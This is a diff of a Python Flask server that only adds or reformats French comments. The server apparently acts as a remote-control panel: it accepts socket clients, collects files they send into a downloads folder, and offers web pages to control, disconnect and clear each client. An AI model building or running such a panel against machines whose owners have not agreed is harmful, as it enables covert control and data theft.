@@ -6,14 +6,15 @@ import ssl
 import struct
 import os
 
-#création de l'appli Flask
+# création de l'appli 
 app = Flask(__name__)
 
+# initialisation client
 clients = []
 client_lock = threading.Lock()
 selected_client = {}
 
-#config socket
+# config socket
 HOST = '0.0.0.0'
 PORT = 12345
 
@@ -45,21 +46,21 @@ def receive_files(sock, client_id, base_dir="downloads"):
 
     while True:
         try: 
-            #lis la taille du nom de fichier
+            # lis la taille du nom de fichier
             raw_len = sock.recv(4)
             if not raw_len:
                 break
             name_len = struct.unpack("!I", raw_len)[0]
 
-            #lis le nom du fichier
+            # lis le nom du fichier
             filename = sock.recv(name_len).decode()
             prefixed_name = f"client_{client_id}_{filename}"
 
-            #lis la taillle du fichier
+            # lis la taillle du fichier
             raw_size = sock.recv(8)
             filesize = struct.unpack("!Q", raw_size)[0]
 
-            #sauvegarde du fichier
+            # sauvegarde du fichier
             filepath = os.path.join(client_dir, prefixed_name)
             with open(filepath, "wb") as f:
                 remaining = filesize
@@ -75,7 +76,7 @@ def receive_files(sock, client_id, base_dir="downloads"):
             print(f"[!] Erreur de réception : {e}")
             break
 
-
+# page d'accueil 
 @app.route('/')
 def index():
     with client_lock:
@@ -84,6 +85,7 @@ def index():
         ]
     return render_template('index.html', clients=connected_clients)
 
+# controle d'un client
 @app.route('/client/<int:client_id>', methods=['GET', 'POST'])
 def control_client(client_id):
     with client_lock:
@@ -111,6 +113,7 @@ def control_client(client_id):
 
     return render_template('control.html', client=client)
 
+# déconnexion d'un client
 @app.route('/client/<int:client_id>/disconnect')
 def disconnect_client(client_id):
     with client_lock:
@@ -124,6 +127,7 @@ def disconnect_client(client_id):
             clients.remove(client)
     return redirect(url_for('index'))
 
+# clear d'un client
 @app.route('/client/<int:client_id>/clear', methods=['POST'])
 def clear_history(client_id):
     with client_lock:
@@ -132,6 +136,7 @@ def clear_history(client_id):
             client['history'] = []
     return redirect(url_for('control_client', client_id=client_id))
 
+# lancement de l'appli
 if __name__ == '__main__':
     server_socket = create_socket()
     threading.Thread(target=accept_clients, args=(server_socket,), daemon=True).start()
